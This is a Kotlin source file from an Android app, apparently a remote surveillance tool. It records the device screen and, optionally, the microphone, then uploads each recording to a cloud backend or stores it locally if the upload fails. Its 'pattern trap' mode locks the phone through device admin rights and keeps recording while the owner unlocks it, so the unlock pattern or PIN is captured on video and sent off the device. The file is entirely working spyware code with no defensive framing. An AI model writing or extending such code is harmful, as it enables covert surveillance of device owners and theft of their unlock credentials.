package com.example.myandroid

import android.content.Context
import android.content.Intent
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.MediaRecorder
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.util.DisplayMetrics
import android.view.WindowManager
import kotlinx.coroutines.*
import java.io.File

object ScreenRecordManager {
    var expectedMode: String = ""
    var pendingDur: Int = 60
    var pendingQual: String = "MED"
    var pendingAudio: Boolean = false
    var pendingFps: Int = 30
    var isPatternTrap: Boolean = false

    private var mediaProjection: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var mediaRecorder: MediaRecorder? = null
    private var recordJob: Job? = null
    
    var isRecording = false
    var isPaused = false

    fun pauseRecording() {
        if (isRecording && !isPaused && android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.N) {
            try { mediaRecorder?.pause(); isPaused = true; DebugLogger.log("SCREEN_REC", "Paused (Screen Off)") } catch(e:Exception){}
        }
    }

    fun resumeRecording() {
        if (isRecording && isPaused && android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.N) {
            try { mediaRecorder?.resume(); isPaused = false; DebugLogger.log("SCREEN_REC", "Resumed (Screen On)") } catch(e:Exception){}
        }
    }

    fun startRecording(ctx: Context, resultCode: Int, data: Intent) {
        if (isRecording) return
        isRecording = true
        
        recordJob = CoroutineScope(Dispatchers.IO).launch {
            val outputFile = File(ctx.cacheDir, "vid_${System.currentTimeMillis()}.mp4")
            try {
                val mpm = ctx.getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
                mediaProjection = mpm.getMediaProjection(resultCode, data)
                
                val wm = ctx.getSystemService(Context.WINDOW_SERVICE) as WindowManager
                val metrics = DisplayMetrics()
                wm.defaultDisplay.getRealMetrics(metrics)
                
                var width = metrics.widthPixels
                var height = metrics.heightPixels
                // Optimized Bitrates: UI recording needs far less bandwidth
                var bitRate = 800000 // 0.8 Mbps for 720p
                
                when (pendingQual) {
                    "ULTRA_LOW" -> { width = 360; height = 640; bitRate = 150000 }
                    "LOW" -> { width = 480; height = 854; bitRate = 350000 } 
                    "HIGH" -> { width = 1080; height = 1920; bitRate = 1800000 }
                    else -> { width = 720; height = 1280; bitRate = 700000 }
                }
                
                // Scaling bitrate based on FPS (e.g. 15fps needs less than 30fps)
                bitRate = (bitRate * (pendingFps / 30f)).toInt().coerceAtLeast(100000)
                
                mediaRecorder = if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.S) {
                    MediaRecorder(ctx)
                } else {
                    MediaRecorder()
                }
                
                mediaRecorder?.apply {
                    if (pendingAudio && PermissionManager.hasMic(ctx)) {
                        setAudioSource(MediaRecorder.AudioSource.MIC)
                    }
                    setVideoSource(MediaRecorder.VideoSource.SURFACE)
                    setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                    setOutputFile(outputFile.absolutePath)
                    setVideoSize(width, height)
                    // Use HEVC (H.265) for 50% better compression if on Android 10+
                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.Q) {
                        setVideoEncoder(MediaRecorder.VideoEncoder.HEVC)
                    } else {
                        setVideoEncoder(MediaRecorder.VideoEncoder.H264)
                    }
                    if (pendingAudio && PermissionManager.hasMic(ctx)) {
                        setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                    }
                    setVideoEncodingBitRate(bitRate)
                    setVideoFrameRate(pendingFps)
                    prepare()
                }
                
                virtualDisplay = mediaProjection?.createVirtualDisplay(
                    "CortexScreenRecord",
                    width, height, metrics.densityDpi,
                    DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                    mediaRecorder?.surface, null, null
                )
                
                mediaRecorder?.start()
                DebugLogger.log("SCREEN_REC", "Recording active: ${pendingDur}s | Quality: $pendingQual | Audio: $pendingAudio | Trap: $isPatternTrap")
                
                if (isPatternTrap) {
                    delay(800) // Buffer to ensure frame stream is initialized before lockdown
                    val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
                    val comp = android.content.ComponentName(ctx, MyDeviceAdminReceiver::class.java)
                    if (dpm.isAdminActive(comp)) {
                        dpm.lockNow()
                        DebugLogger.log("CAPTURE_PATTERN", "Device locked. Awaiting user unlock...")
                    }
                    delay(600_000L) // 10 minutes absolute fallback limit
                } else {
                    delay(pendingDur * 1000L)
                }
                
            } catch (e: Exception) {
                DebugLogger.log("SCREEN_REC_ERR", "Capture failed: ${e.message}")
            } finally {
                internalStop(ctx, outputFile)
            }
        }
    }

    fun stopRecording() {
        // Cancelling the coroutine immediately drops it into the 'finally' block above.
        recordJob?.cancel()
    }

    private fun internalStop(ctx: Context, outputFile: File) {
        try { mediaRecorder?.stop() } catch(e:Exception){}
        mediaRecorder?.reset()
        mediaRecorder?.release()
        mediaRecorder = null
        
        virtualDisplay?.release()
        virtualDisplay = null
        
        mediaProjection?.stop()
        mediaProjection = null
        
        isRecording = false
        isPatternTrap = false
        DebugLogger.log("SCREEN_REC", "Hardware resources released.")
        
        if (outputFile.exists() && outputFile.length() > 0) {
            // Use runBlocking to ensure IO upload thread finishes before cleanup destroys scope
            runBlocking { 
                if (CloudManager.uploadFile(ctx, outputFile, "SCREEN_RECORD")) {
                    outputFile.delete()
                } else {
                    DumpManager.vaultMedia(outputFile, "SCREEN_RECORD")
                }
            }
        }
    }
}
